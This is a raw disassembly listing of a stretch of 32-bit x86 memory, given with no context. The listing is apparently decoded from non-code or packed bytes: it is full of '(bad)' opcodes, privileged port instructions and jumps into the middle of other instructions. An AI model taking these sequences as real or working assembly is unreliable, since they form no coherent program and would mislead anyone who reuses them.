  40c450:	xchg   esp,eax
  40c451:	mov    es,WORD PTR [ebp-0x4f]
  40c454:	pop    ecx
  40c455:	and    ch,BYTE PTR [ebx+0x4225511d]
  40c45b:	xchg   BYTE PTR [ecx],al
  40c45d:	js     0x40c3ed
  40c45f:	bound  ebp,QWORD PTR [esi-0x3ca93bfe]
  40c465:	outs   dx,BYTE PTR ds:[esi]
  40c466:	dec    ebp
  40c467:	(bad)  
  40c468:	pop    ss
  40c469:	jmp    0x7ab:0x90ee8fbd
  40c470:	jle    0x40c4a3
  40c472:	sbb    DWORD PTR [esi+0x38],0xecefaed5
  40c479:	fldenv [ebp-0x6f]
  40c47c:	inc    esp
  40c47d:	jne    0x40c4f1
  40c47f:	fdiv   QWORD PTR [eax]
  40c481:	jb     0x40c4f3
  40c483:	cdq    
  40c484:	pop    esp
  40c485:	xchg   edx,eax
  40c486:	inc    edi
  40c487:	push   eax
  40c488:	(bad)
  40c48b:	adc    BYTE PTR [eax],bh
  40c48d:	lea    edi,[edi-0x45d51a86]
  40c493:	inc    edi
  40c494:	loop   0x40c504
  40c496:	xor    eax,0x5708a29c
  40c49b:	jge    0x40c424
  40c49d:	and    al,BYTE PTR [ecx]
  40c49f:	retf   0x7319
  40c4a2:	lods   eax,DWORD PTR ds:[esi]
  40c4a3:	lods   eax,DWORD PTR ds:[esi]
  40c4a4:	dec    eax
  40c4a5:	inc    esp
  40c4a6:	or     bh,BYTE PTR [ebx+0x4b7aac05]
  40c4ac:	sbb    DWORD PTR [ebx+0x78],esi
  40c4af:	and    al,0x68
  40c4b1:	test   al,0xa4
  40c4b3:	retf   
  40c4b4:	xchg   ebx,eax
  40c4b5:	nop
  40c4b6:	int3   
  40c4b7:	es repnz aad 0x6a
  40c4bb:	loop   0x40c44b
  40c4bd:	sub    ah,BYTE PTR [esi+0x53d77e77]
  40c4c3:	pop    ebx
  40c4c4:	sbb    DWORD PTR [ebp-0x2cacad55],esp
  40c4ca:	aaa    
  40c4cb:	add    BYTE PTR [ebx],bh
  40c4cd:	fwait
  40c4ce:	pop    eax
  40c4cf:	cmp    DWORD PTR [eax],0xffffffba
  40c4d2:	ret    0xa31d
  40c4d5:	sti    
  40c4d6:	mov    cl,0xfa
  40c4d8:	xor    BYTE PTR [ebx],bh
  40c4da:	inc    ebp
  40c4db:	sub    bh,BYTE PTR [esi]
  40c4dd:	mov    ebx,0x33f82b63
  40c4e2:	mov    dl,0xd7
  40c4e4:	pushf  
  40c4e5:	aas    
  40c4e6:	imul   BYTE PTR [ecx+0x6d]
  40c4e9:	(bad)  
  40c4ea:	stc    
  40c4eb:	pop    edi
  40c4ec:	cld    
  40c4ed:	xor    al,0xb7
  40c4f0:	repnz mov edi,0x233996c4
  40c4f6:	xor    cl,BYTE PTR [ebp+0x1242f6af]
  40c4fc:	repnz add DWORD PTR [edx],ebx
  40c4ff:	arpl   WORD PTR [edi-0xd2493f8],bp
  40c505:	dec    edi
  40c506:	xlat   BYTE PTR ds:[ebx]
  40c507:	lods   eax,DWORD PTR ds:[esi]
  40c508:	mov    ebp,0xebbf6599
  40c50d:	dec    edx
  40c50e:	adc    eax,0x92e5e02c
  40c513:	mov    eax,0xca3a3594
  40c518:	in     eax,dx
  40c519:	fwait
  40c51a:	jge    0x40c580
  40c51c:	ins    BYTE PTR es:[edi],dx
  40c51d:	cmp    bl,BYTE PTR [esi+ecx*8-0x17]
  40c521:	inc    esi
  40c522:	test   al,0xb
  40c524:	inc    esp
  40c525:	sub    eax,0xdb6808af
  40c52a:	fiadd  DWORD PTR [edx-0x32]
  40c52d:	outs   dx,DWORD PTR ds:[esi]
  40c52e:	pop    edx
  40c52f:	adc    bl,0x59
  40c532:	(bad)  
  40c533:	test   DWORD PTR [esi-0xd],0x268928d7
  40c53a:	jno    0x40c5ba
  40c53c:	out    dx,al
  40c53d:	cmp    esp,edi
  40c53f:	push   ebp
  40c540:	and    al,0xc5
  40c542:	jle    0x40c57a
  40c544:	(bad)  
  40c545:	fld    DWORD PTR [ebp+0x24dd824c]
  40c54b:	adc    DWORD PTR [eax+eiz*2],0xffffffb8
  40c54f:	and    esp,DWORD PTR [ebx+0x32]
  40c552:	xor    al,al
  40c554:	test   dl,dl
  40c556:	mov    DWORD PTR [edx+esi*4],edx
  40c559:	fs xchg ebp,eax
  40c55b:	pop    ecx
  40c55c:	mov    ds:0x75f21bf7,eax
  40c561:	cmp    edi,DWORD PTR [edx+ecx*8+0x785d0f6e]
  40c568:	mul    DWORD PTR [edx-0x1103cb93]
  40c56e:	aad    0x7e
  40c570:	in     eax,dx
  40c571:	inc    edx
  40c572:	or     eax,0x225551af
  40c577:	arpl   cx,bp
  40c579:	ss mov esi,0xf38987c8
  40c57f:	hlt    
  40c580:	dec    ebp
  40c581:	adc    BYTE PTR [ebp+0x6d],al
  40c584:	push   es
  40c585:	sbb    esp,DWORD PTR [ecx]
  40c587:	dec    esp
  40c588:	jl     0x40c50e
  40c58a:	jp     0x40c5db
  40c58c:	in     al,dx
  40c58d:	adc    dl,BYTE PTR [edx+0x51]
  40c590:	or     BYTE PTR [ebx],al
  40c592:	jle    0x40c59c
  40c594:	in     eax,dx
  40c595:	test   eax,0xc7c668b2
  40c59a:	jecxz  0x40c5b9
  40c59c:	cmp    ch,BYTE PTR [ecx]
  40c59e:	and    bl,dh
  40c5a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5a1:	or     eax,DWORD PTR [edi-0x42]
  40c5a4:	xchg   edx,eax
  40c5a5:	dec    edi
  40c5a6:	sti    
  40c5a7:	test   eax,0x277de972
  40c5ac:	lea    esp,[eax]
  40c5ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5af:	mov    dl,0x4c
  40c5b1:	jns    0x40c5d5
  40c5b3:	out    dx,eax
  40c5b4:	inc    ebp
  40c5b5:	mov    dh,0xaf
  40c5b7:	push   ss
  40c5b8:	cwde   
  40c5b9:	xchg   ecx,eax
  40c5ba:	inc    esi
  40c5bb:	ins    BYTE PTR es:[edi],dx
  40c5bc:	mov    eax,0x501e08f2
  40c5c1:	and    bl,BYTE PTR [esi+0xb]
  40c5c4:	jne    0x40c591
  40c5c6:	cmp    ah,BYTE PTR [esi+0x55a17b72]
  40c5cc:	xor    ch,0xeb
  40c5cf:	in     eax,0x23
  40c5d1:	mov    ch,cl
  40c5d3:	int    0xa1
  40c5d5:	out    dx,al
  40c5d6:	sar    DWORD PTR [edi+ecx*4+0x7b],1
  40c5da:	inc    ecx
  40c5db:	adc    eax,0xd716c7c6
  40c5e0:	clc    
  40c5e1:	sub    eax,0x1cac867c
  40c5e6:	mov    dl,0x7e
  40c5e8:	or     BYTE PTR [esi+0x32d0c6a4],cl
  40c5ee:	test   BYTE PTR [ebx-0x1115f638],al
  40c5f4:	scas   al,BYTE PTR es:[edi]
  40c5f5:	ja     0x40c5e7
  40c5f7:	mov    ds:0xce9c1546,al
  40c5fc:	rol    edx,cl
  40c5fe:	jnp    0x40c5e7
  40c600:	or     bl,BYTE PTR [eax-0xf102f36]
  40c606:	mov    eax,ds:0xa51b0ae7
  40c60b:	mov    DWORD PTR [ecx+0x4b],0x4561560f
  40c612:	dec    esp
  40c613:	call   0x8937226a
  40c618:	(bad)  
  40c619:	adc    eax,0x17274f3b
  40c61e:	push   eax
  40c61f:	adc    DWORD PTR [esi],esp
  40c621:	inc    edx
  40c622:	pop    ebp
  40c623:	pop    es
  40c624:	test   BYTE PTR [esi],bh
  40c626:	sar    DWORD PTR [ecx+eax*8+0x568ab4e4],0x71
  40c62e:	dec    edi
  40c62f:	pop    esp
  40c630:	adc    BYTE PTR [ebp-0x2adadd7a],bl
  40c636:	mov    al,0x97
  40c638:	ror    BYTE PTR [ebx-0x16],cl
  40c63b:	mov    ds:0xf563f500,eax
  40c640:	outs   dx,BYTE PTR ds:[esi]
  40c641:	fst    DWORD PTR [ebx]
  40c643:	jb     0x40c6a8
  40c645:	sub    al,0xd7
  40c647:	mov    ch,0x6d
  40c649:	in     al,dx
  40c64a:	jg     0x40c6b8
  40c64c:	and    ecx,DWORD PTR [edx+0x5126b95d]
  40c652:	dec    ecx
  40c653:	mov    ds:0xc0b03522,al
  40c658:	jne    0x40c655
  40c65a:	push   ebx
  40c65b:	mov    ebp,0xb5280ffd
  40c660:	in     eax,dx
  40c661:	(bad)  
  40c662:	or     ecx,ecx
  40c664:	add    BYTE PTR [esi-0x67bcea56],al
  40c66a:	and    eax,0xf6c20a88
  40c66f:	pop    ecx
  40c670:	mov    ds:0x35619a95,al
  40c675:	xor    al,BYTE PTR [edi-0x59]
  40c678:	(bad)  
  40c679:	enter  0xf20a,0xe6
  40c67d:	test   DWORD PTR [ecx+0x40fc6a02],esi
  40c683:	dec    ecx
  40c684:	leave  
  40c685:	fs push cs
  40c687:	(bad)  
  40c688:	push   cs
  40c689:	xor    al,0xab
  40c68b:	shl    BYTE PTR [esi-0x31e2dd13],1
  40c691:	fstp   QWORD PTR [edx+0x36c4b179]
  40c697:	xchg   ebx,eax
  40c698:	pop    ebx
  40c699:	or     al,0x26
  40c69b:	out    dx,al
  40c69c:	mov    ds:0xe7232fe5,eax
  40c6a1:	(bad)  
  40c6a2:	sub    esi,eax
  40c6a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6a5:	dec    ebx
  40c6a6:	sbb    al,0xc8
  40c6a8:	cmp    eax,0x35bbe9f3
  40c6ad:	outs   dx,DWORD PTR ds:[esi]
  40c6ae:	inc    eax
  40c6af:	stos   BYTE PTR es:[edi],al
  40c6b0:	mov    WORD PTR [ebx-0x6f],?
  40c6b3:	sub    eax,0x740cd790
  40c6b8:	xchg   bl,al
  40c6ba:	xor    edx,DWORD PTR [eiz*1-0x3b710d5f]
  40c6c1:	ror    ebx,1
  40c6c3:	call   0xff794e3c
  40c6c8:	fnstenv [ecx+eax*8]
  40c6cb:	sub    ch,ah
  40c6cd:	xchg   ebp,eax
  40c6ce:	push   edx
  40c6cf:	add    BYTE PTR [esp+ecx*1-0x70],0xb9
  40c6d4:	push   esp
  40c6d5:	shl    BYTE PTR [ebx-0x15],0xaf
  40c6d9:	out    dx,eax
  40c6da:	adc    dh,BYTE PTR [esi]
  40c6dc:	aaa    
  40c6dd:	inc    esp
  40c6de:	shr    BYTE PTR [eax+0x2abcd8b7],cl
  40c6e4:	ss or  eax,0xf351f329
  40c6ea:	out    0xab,al
  40c6ec:	data16 jp 0x40c6a1
  40c6ef:	ins    DWORD PTR es:[edi],dx
  40c6f0:	data16 fcmovnbe st,st(3)
  40c6f3:	ja     0x40c6d8
  40c6f5:	sub    edx,eax
  40c6f7:	(bad)  
  40c6f8:	imul   ebp,DWORD PTR [edi+ebp*2],0x15
  40c6fc:	(bad)  
  40c6fd:	sub    eax,0x78c08c41
  40c702:	loop   0x40c703
  40c704:	or     eax,0xafa4755c
  40c709:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c70a:	hlt    
  40c70b:	in     al,dx
  40c70c:	(bad)  
  40c70d:	(bad)  
  40c70e:	mov    dh,0x3e
  40c710:	adc    eax,0x615eda1b
  40c715:	std    
  40c716:	(bad)  
  40c717:	xor    ebx,ebp
  40c719:	imul   edx,edx,0x6219376e
  40c71f:	icebp  
  40c720:	pop    eax
  40c721:	xor    edx,esi
  40c723:	in     al,0xbf
  40c725:	sub    eax,0x89a53e8b
  40c72a:	inc    edi
  40c72b:	sbb    bh,bh
  40c72d:	mov    al,0x3b
  40c72f:	aad    0x1
  40c731:	mov    eax,ds:0xfd7ae003
  40c736:	sbb    bl,dh
  40c738:	lods   al,BYTE PTR ds:[esi]
  40c739:	les    edx,FWORD PTR [edi+edx*1-0x26309c10]
  40c740:	mov    ecx,0x77f61ff4
  40c745:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c746:	xchg   esp,eax
  40c747:	out    0x6c,eax
  40c749:	inc    eax
  40c74a:	and    DWORD PTR [ebx-0x7a],0xfba23b2e
  40c751:	jmp    0x40c7b2
  40c753:	loopne 0x40c784
  40c755:	jae    0x40c7c0
  40c757:	sbb    dl,BYTE PTR [ebx+0x5]
  40c75a:	ja     0x40c751
  40c75c:	xchg   esi,eax
  40c75d:	clc    
  40c75e:	cmp    dl,BYTE PTR [ebx]
  40c760:	add    edi,DWORD PTR [edi-0x2072ecc2]
  40c766:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c767:	neg    esp
  40c769:	push   ecx
  40c76a:	cmp    BYTE PTR [esi+0x7347153e],dl
  40c770:	imul   ebp,DWORD PTR gs:[esi+0x6a],0xd875f720
  40c778:	call   0xbd52:0x953ad0e2
  40c77f:	ret    
  40c780:	jle    0x40c7b6
  40c782:	mov    ds:0x2edba564,eax
  40c787:	mov    bl,BYTE PTR [edx+0x67]
  40c78a:	jne    0x40c7af
  40c78c:	xchg   esi,eax
  40c78d:	lock sbb DWORD PTR [ebx-0x17],ebp
  40c791:	(bad)  
  40c792:	dec    esp
  40c793:	xor    esp,ebp
  40c795:	hlt    
  40c796:	stc    
  40c797:	pop    edi
  40c798:	js     0x40c77f
  40c79a:	dec    ecx
  40c79b:	scas   eax,DWORD PTR es:[edi]
  40c79c:	ja     0x40c79c
  40c79e:	fisubr WORD PTR [esp+eiz*4]
  40c7a1:	jl     0x40c7a1
  40c7a3:	icebp  
  40c7a4:	inc    edi
  40c7a5:	int    0xf9
  40c7a7:	xchg   DWORD PTR [edx-0x8],esp
  40c7aa:	in     al,0x79
  40c7ac:	dec    esp
  40c7ad:	xor    al,0x82
  40c7af:	and    eax,0x71403460
  40c7b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7b5:	cdq    
  40c7b6:	adc    DWORD PTR [edx-0x73],esi
  40c7b9:	dec    ebx
  40c7ba:	ins    DWORD PTR es:[edi],dx
  40c7bb:	jb     0x40c76b
  40c7bd:	sub    al,0xb2
  40c7bf:	and    BYTE PTR [edx+esi*8],dl
  40c7c2:	pushf  
  40c7c3:	jg     0x40c79a
  40c7c5:	int3   
  40c7c6:	into   
  40c7c7:	sti    
  40c7c8:	mov    edx,0xee9106c
  40c7cd:	and    DWORD PTR [esp+ebp*2-0x20],edi
  40c7d1:	lods   al,BYTE PTR ds:[esi]
  40c7d2:	sub    al,0xad
  40c7d4:	(bad)  
  40c7d5:	ins    BYTE PTR es:[edi],dx
  40c7d6:	ins    DWORD PTR es:[edi],dx
  40c7d7:	cdq    
  40c7d8:	pop    ebx
  40c7d9:	xor    dh,bl
  40c7db:	dec    edi
  40c7dc:	outs   dx,BYTE PTR ds:[esi]
  40c7dd:	lds    ebp,FWORD PTR [eax]
  40c7df:	or     BYTE PTR [ebp-0x1d],ah
  40c7e2:	cmp    al,BYTE PTR ds:0xfb8c9cef
  40c7e8:	push   eax
  40c7e9:	xchg   edx,eax
  40c7ea:	je     0x40c7c9
  40c7ec:	icebp  
  40c7ed:	fidivr DWORD PTR [eax]
  40c7ef:	sub    BYTE PTR [ecx+edx*8],bl
  40c7f2:	jp     0x40c836
  40c7f4:	jno    0x40c848
  40c7f6:	cmp    DWORD PTR [esi+0x12],0x7a4392a0
  40c7fd:	sbb    al,0xc6
  40c7ff:	loop   0x40c82c
  40c801:	ficom  DWORD PTR [edi-0x58dd9dbd]
  40c807:	jp     0x40c800
  40c809:	xchg   edi,eax
  40c80a:	shr    eax,cl
  40c80c:	mov    WORD PTR [ebp-0x34],ds
  40c80f:	out    dx,al
  40c810:	mov    esi,0x8c981725
  40c815:	inc    ebx
  40c816:	or     eax,0x990adfa2
  40c81b:	cld    
  40c81c:	dec    edx
  40c81d:	sub    al,dl
  40c81f:	pop    es
  40c820:	mov    WORD PTR [edx+0x3d],es
  40c823:	scas   al,BYTE PTR es:[edi]
  40c824:	xor    cl,BYTE PTR [edi]
  40c826:	sbb    BYTE PTR [edi+edi*4+0x16],0x82
  40c82b:	jbe    0x40c7c3
  40c82d:	adc    bl,cl
  40c82f:	pop    edx
  40c830:	out    dx,al
  40c831:	pop    ebp
  40c832:	arpl   WORD PTR [eax-0x7a7551b0],sp
  40c838:	mov    ebx,0x2ded5f26
  40c83d:	daa    
  40c83e:	sub    al,0x28
  40c840:	sbb    BYTE PTR [ebp-0x755d7a7],0x67
  40c847:	nop
  40c848:	call   0x50d9e1c7
  40c84d:	sub    bl,al
  40c84f:	and    eax,0x3ae34ed3
  40c854:	mov    ah,0xc1
  40c856:	mov    bl,BYTE PTR [edx-0x78f445bf]
  40c85c:	call   0xcca6b87e
  40c861:	jbe    0x40c7fb
  40c863:	add    edi,DWORD PTR [ebp-0x3d986efd]
  40c869:	mov    edi,DWORD PTR [esi+0x7d]
  40c86c:	dec    ebp
  40c86d:	mov    bl,0x23
  40c86f:	add    BYTE PTR [ebx-0x4f],0x70
  40c873:	and    eax,0x68cc4f2a
  40c878:	pusha  
  40c879:	add    DWORD PTR [edi-0x3ef93f21],esp
  40c87f:	push   esp
  40c880:	dec    ecx
  40c881:	sub    esp,DWORD PTR [ecx]
  40c883:	ins    DWORD PTR es:[edi],dx
  40c884:	push   ecx
  40c885:	sbb    al,0x0
  40c887:	xchg   dh,ah
  40c889:	and    ch,al
  40c88b:	pop    esp
  40c88c:	push   ds
  40c88d:	lahf   
  40c88e:	and    BYTE PTR [edx-0x3848f6d8],0x2c
  40c895:	mov    ch,BYTE PTR [ecx-0x30]
  40c898:	fstp   TBYTE PTR [edx-0x5b]
  40c89b:	pop    esi
  40c89c:	pushf  
  40c89d:	mov    ds:0x7298846,eax
  40c8a2:	loopne 0x40c844
  40c8a4:	jge    0x40c90d
  40c8a6:	pop    ds
  40c8a7:	pop    esp
  40c8a8:	sbb    edx,DWORD PTR [eax-0x22137e1e]
  40c8ae:	xchg   esp,eax
  40c8af:	jne    0x40c8e4
  40c8b1:	scas   al,BYTE PTR es:[edi]
  40c8b2:	sbb    bl,BYTE PTR [esi-0x30]
  40c8b5:	je     0x40c857
  40c8b7:	(bad)
  40c8ba:	and    DWORD PTR [esi+0x12],0x24a75d44
  40c8c1:	or     ah,cl
  40c8c3:	mov    dh,0x26
  40c8c5:	(bad)  [edi-0x3cba4ab8]
  40c8cb:	adc    esi,edx
  40c8cd:	sbb    eax,0xd264593b
  40c8d2:	out    0xb1,al
  40c8d4:	ror    DWORD PTR [ebp+esi*1+0x79],0x63
  40c8d9:	inc    BYTE PTR [esi+0x60]
  40c8dc:	(bad)  
  40c8dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8de:	imul   esp,DWORD PTR [ebp-0x60945a35],0xed29c6a8
  40c8e8:	mov    dl,0xfd
  40c8ea:	fldenv [eax+0x2ca205ae]
  40c8f0:	mov    cl,BYTE PTR [ebp-0x64]
  40c8f3:	xor    BYTE PTR [edx-0x230f8a62],dl
  40c8f9:	fild   WORD PTR [edx+0x0]
  40c8fc:	sub    eax,0x4c4be651
  40c901:	addr16 xchg ebx,eax
  40c903:	sbb    BYTE PTR [esi-0x6fb852f9],dh
  40c909:	xchg   esp,eax
  40c90a:	cdq    
  40c90b:	xchg   DWORD PTR [ebx+0x3718cdb7],esp
  40c911:	cmp    DWORD PTR [esi+ebp*8-0x19],ebx
  40c915:	stos   BYTE PTR es:[edi],al
  40c916:	loop   0x40c8cb
  40c918:	jge    0x40c903
  40c91a:	adc    BYTE PTR [edx-0x1b4829f],al
  40c920:	dec    eax
  40c921:	sar    DWORD PTR [esi+0x9],cl
  40c924:	loop   0x40c927
  40c926:	mov    ebp,0xc3dd373b
  40c92b:	mov    dh,0x59
  40c92d:	fadd   DWORD PTR [eax+0x46d7bb00]
  40c933:	lods   al,BYTE PTR ds:[esi]
  40c934:	ja     0x40c91f
  40c936:	push   ebp
  40c937:	cmp    bl,BYTE PTR ds:0xe99197ce
  40c93d:	(bad)  
  40c93e:	daa    
  40c93f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c940:	cmp    al,0x6b
  40c942:	hlt    
  40c943:	test   DWORD PTR [ebx+0x41],0xf6f42f1c
  40c94a:	iret   
  40c94b:	aas    
  40c94c:	stc    
  40c94d:	repnz and ebx,esp
  40c950:	inc    edi
  40c951:	retf   
  40c952:	out    dx,eax
  40c953:	outs   dx,BYTE PTR ds:[esi]
  40c954:	mov    ebx,0x5ffb6cb8
  40c959:	imul   esi,DWORD PTR [ebp-0x47],0x48
  40c95d:	loopne 0x40c90c
  40c95f:	lods   eax,DWORD PTR ds:[esi]
  40c960:	cmp    eax,0x2631e49a
  40c965:	enter  0xed8,0x79
  40c969:	jbe    0x40c91e
  40c96b:	dec    ebp
  40c96c:	(bad)  
  40c96d:	cmp    eax,edi
  40c96f:	push   dx
  40c971:	test   eax,0xd0989c11
  40c976:	inc    edi
  40c977:	xor    eax,0xb6540a48
  40c97c:	leave  
  40c97d:	xor    al,0xf5
  40c97f:	jecxz  0x40c9f5
  40c981:	and    ebx,esp
  40c983:	mov    esi,ebp
  40c985:	sbb    al,0x36
  40c987:	cli    
  40c988:	xchg   DWORD PTR [esi],esi
  40c98a:	pop    DWORD PTR [eax+0x39]
  40c98d:	in     al,dx
  40c98e:	jmp    0xa1fd6adb
  40c993:	jae    0x40c92a
  40c995:	ja     0x40c986
  40c997:	lock vpmacssdd xmm4,xmm4,XMMWORD PTR es:[eax-0xe54eeee],xmm3
  40c9a3:	repz dec edx
  40c9a5:	dec    ecx
  40c9a6:	rcr    esi,0xee
  40c9a9:	jno    0x40c9b4
  40c9ab:	out    dx,eax
  40c9ac:	fstp   st(7)
  40c9ae:	daa    
  40c9af:	fisttp DWORD PTR ds:0xe0a32133
  40c9b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9b6:	mov    ebx,0x748dc3ec
  40c9bb:	pop    edi
  40c9bc:	outs   dx,DWORD PTR ds:[esi]
  40c9bd:	imul   ecx,DWORD PTR [ecx],0xdd78dd2f
  40c9c3:	in     eax,0xfe
  40c9c5:	mov    edi,esi
  40c9c7:	and    dh,BYTE PTR [ebx-0x78]
  40c9ca:	scas   eax,DWORD PTR es:[edi]
  40c9cb:	pop    esi
  40c9cc:	jp     0x40c9f5
  40c9ce:	inc    esp
  40c9cf:	imul   ebx,DWORD PTR [ebp-0x476e759],0xffffff8f
  40c9d6:	pop    es
  40c9d7:	and    BYTE PTR [esi-0x31],ah
  40c9da:	stc    
  40c9db:	pop    ds
  40c9dc:	fcom   QWORD PTR ds:0xbac1d3b1
  40c9e2:	cli    
  40c9e3:	gs inc ebp
  40c9e5:	jle    0x40c9bc
  40c9e7:	imul   eax,DWORD PTR [eax-0x71],0x3ac99ccf
  40c9ee:	mov    dl,0x67
  40c9f0:	xchg   edx,eax
  40c9f1:	out    0xbe,eax
  40c9f3:	pop    ss
  40c9f4:	xor    BYTE PTR [eax],dl
  40c9f6:	inc    eax
  40c9f7:	arpl   WORD PTR [ecx+0x6dc508aa],cx
  40c9fd:	aam    0x71
  40c9ff:	xchg   esi,eax
  40ca00:	rol    BYTE PTR [eax+0x57c06478],cl
  40ca06:	xchg   ecx,eax
  40ca07:	arpl   WORD PTR [edi-0x56],bx
  40ca0a:	ins    DWORD PTR es:[edi],dx
  40ca0b:	iret   
  40ca0c:	inc    edx
  40ca0d:	or     al,0x57
  40ca0f:	adc    eax,0x8ee465f
  40ca14:	aaa    
  40ca15:	push   esp
  40ca16:	add    eax,DWORD PTR [edx+0x50]
  40ca19:	sub    al,0x4b
  40ca1b:	jmp    FWORD PTR [ecx-0x32]
  40ca1e:	es xchg ebp,eax
  40ca20:	sub    BYTE PTR [ecx+0x78],al
  40ca23:	push   ebx
  40ca24:	lahf   
  40ca25:	out    dx,al
  40ca26:	inc    ebp
  40ca27:	add    DWORD PTR [edx],0xffffffa2
  40ca2a:	mov    edi,0xd0095334
  40ca2f:	sbb    eax,DWORD PTR [ebp+0x664500a6]
  40ca35:	pushf  
  40ca36:	call   0xe89a:0xbdfb91db
  40ca3d:	add    al,0x94
  40ca3f:	ja     0x40c9fc
  40ca41:	xchg   edi,eax
  40ca42:	aam    0xeb
  40ca44:	mov    cl,0x9c
  40ca46:	sahf   
  40ca47:	adc    BYTE PTR [ebx],0x68
  40ca4a:	lds    esp,FWORD PTR cs:[edx]
  40ca4d:	or     DWORD PTR [edx+0xbd765d7],0xdff6282
  40ca57:	xor    dh,BYTE PTR [edx-0x1d]
  40ca5a:	ja     0x40ca3a
  40ca5c:	ror    esi,1
  40ca5e:	rcr    edx,cl
  40ca60:	(bad)  
  40ca61:	cmp    DWORD PTR [esi+0x18f81d7b],esi
  40ca67:	cmp    ah,BYTE PTR [ebx+0x7af7d9d4]
  40ca6d:	test   ch,dh
  40ca6f:	pop    ecx
  40ca70:	(bad)  
  40ca71:	test   eax,0xd535a195
  40ca76:	test   esp,ebx
  40ca78:	daa    
  40ca79:	mov    ds:0xb423e16a,eax
  40ca7e:	xlat   BYTE PTR ds:[ebx]
  40ca7f:	dec    esi
  40ca80:	and    ecx,DWORD PTR [edx-0x13]
  40ca83:	jnp    0x40ca7e
  40ca85:	(bad)  
  40ca86:	sub    ebp,DWORD PTR [esp+eax*2]
  40ca89:	dec    esp
  40ca8a:	loopne 0x40ca17
  40ca8c:	fisttp QWORD PTR [edi+ebp*1+0x3]
  40ca90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca91:	pop    edi
  40ca92:	stos   BYTE PTR es:[edi],al
  40ca93:	cwde   
  40ca94:	bound  ecx,QWORD PTR [edi+0x23]
  40ca97:	add    esi,DWORD PTR [esp+edx*1-0x39b7c805]
  40ca9e:	push   cs
  40ca9f:	mov    BYTE PTR [edx],cl
  40caa1:	inc    esp
  40caa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40caa3:	lods   eax,DWORD PTR ds:[esi]
  40caa4:	outs   dx,BYTE PTR ds:[esi]
  40caa5:	int3   
  40caa6:	arpl   WORD PTR [eax],di
  40caa8:	stos   BYTE PTR es:[edi],al
  40caa9:	adc    DWORD PTR [ebp-0x5be08f7f],esi
  40caaf:	jno    0x40ca3f
  40cab1:	dec    ebp
  40cab2:	aaa    
  40cab3:	mov    dh,cl
  40cab5:	push   esp
  40cab6:	mov    dl,0x4f
  40cab8:	pushf  
  40cab9:	mov    dl,0xf6
  40cabb:	mov    bl,0x3d
  40cabd:	ins    BYTE PTR es:[edi],dx
  40cabe:	mov    ecx,0xc71ab976
  40cac3:	cmp    DWORD PTR [ecx-0x5b],edx
  40cac6:	jnp    0x40ca8e
  40cac8:	scas   eax,DWORD PTR es:[edi]
  40cac9:	(bad)  
  40caca:	aam    0x7a
  40cacc:	push   ebx
  40cacd:	add    dl,BYTE PTR [esi+ebx*8-0x25]
  40cad1:	inc    edx
  40cad2:	sti    
  40cad3:	jns    0x40cb13
  40cad5:	push   ds
  40cad6:	(bad)  
  40cad7:	sbb    eax,0xecd4f826
  40cadc:	xor    eax,0x377e167e
  40cae1:	sti    
  40cae2:	dec    esi
  40cae3:	mov    ebx,0xeda0fcbb
  40cae8:	mov    cl,BYTE PTR [ebx-0x7]
  40caeb:	neg    BYTE PTR ds:0xc3d7c810
  40caf1:	sbb    al,al
  40caf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40caf4:	jae    0x40ca8b
  40caf6:	mov    eax,0x8fdf8b46
  40cafb:	imul   eax,DWORD PTR [ebx],0x67
  40cafe:	inc    ecx
  40caff:	scas   al,BYTE PTR es:[edi]
  40cb00:	mov    al,0xf1
  40cb02:	push   ebp
  40cb03:	bound  ecx,QWORD PTR [eax]
  40cb05:	add    al,0xcb
  40cb07:	test   BYTE PTR [esi],0x84
  40cb0a:	stos   DWORD PTR es:[edi],eax
  40cb0b:	ins    BYTE PTR es:[edi],dx
  40cb0c:	ja     0x40cad5
  40cb0e:	std    
  40cb0f:	jno    0x40caa7
  40cb11:	and    DWORD PTR [edx-0x4b],esp
  40cb14:	repnz or BYTE PTR [ebp-0x7426742],bh
  40cb1b:	bnd jne 0x40cb69
  40cb1e:	and    eax,0x97e0124
  40cb23:	jne    0x40cb7b
  40cb25:	xor    BYTE PTR [ecx+esi*1],dh
  40cb28:	inc    BYTE PTR [ebx-0x2f]
  40cb2b:	mov    DWORD PTR [ecx+0x67f846ff],ebx
  40cb31:	push   ss
  40cb32:	pop    ebx
  40cb33:	inc    ecx
  40cb34:	and    dl,BYTE PTR [ebx+0x33]
  40cb37:	lods   al,BYTE PTR ds:[esi]
  40cb38:	jl     0x40cacd
  40cb3a:	push   0x40a4ac19
  40cb3f:	push   ds
  40cb40:	dec    ebx
  40cb41:	popf   
  40cb42:	push   es
  40cb43:	sub    eax,edi
  40cb45:	ret    
  40cb46:	mov    ds:0x9cacef41,eax
  40cb4b:	loope  0x40cbc7
  40cb4d:	aaa    
  40cb4e:	push   ecx
  40cb4f:	mov    ch,0xd1
  40cb51:	jle    0x40caf2
  40cb53:	clc    
  40cb54:	mov    dh,0x89
  40cb56:	aad    0xda
  40cb58:	popa   
  40cb59:	push   ss
  40cb5a:	(bad)  
  40cb5c:	dec    edx
  40cb5d:	fs jns 0x40cb94
  40cb60:	daa    
  40cb61:	inc    eax
  40cb62:	cmp    ebp,DWORD PTR gs:[ebx-0x17]
  40cb66:	inc    eax
  40cb67:	in     eax,0x82
  40cb69:	add    DWORD PTR [ebp+edi*1+0x41],ebp
  40cb6d:	pop    ebx
  40cb6e:	out    0x85,al
  40cb70:	jnp    0x40cb81
  40cb72:	sub    ebp,DWORD PTR [ecx+edi*2]
  40cb75:	jo     0x40cbb4
  40cb77:	loop   0x40cb6d
  40cb79:	jecxz  0x40cb96
  40cb7b:	dec    ecx
  40cb7c:	mov    WORD PTR [esi-0x3c],fs
